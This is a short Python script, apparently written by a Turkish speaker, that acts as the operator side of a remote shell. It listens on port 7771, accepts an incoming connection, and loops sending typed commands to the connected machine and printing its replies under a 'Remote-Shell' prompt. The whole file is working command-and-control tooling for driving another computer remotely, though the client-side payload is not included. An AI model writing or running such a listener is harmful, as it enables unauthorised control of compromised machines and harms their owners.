import socket

from colorama import Fore,Back,init
init()

host = "0.0.0.0"
port = 7771


baglanti=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
baglanti.bind((host, port))
print("dinleniyor ",host,port)
baglanti.listen(5)
conn, addr = baglanti.accept()
print(conn, addr)
while True:
    remote = input(Fore.GREEN+" Remote-Shell >>>  "+Fore.RESET)
    conn.send(remote.encode("utf-8"))
    response=conn.recv(16384).decode("utf-8")
    print(response)
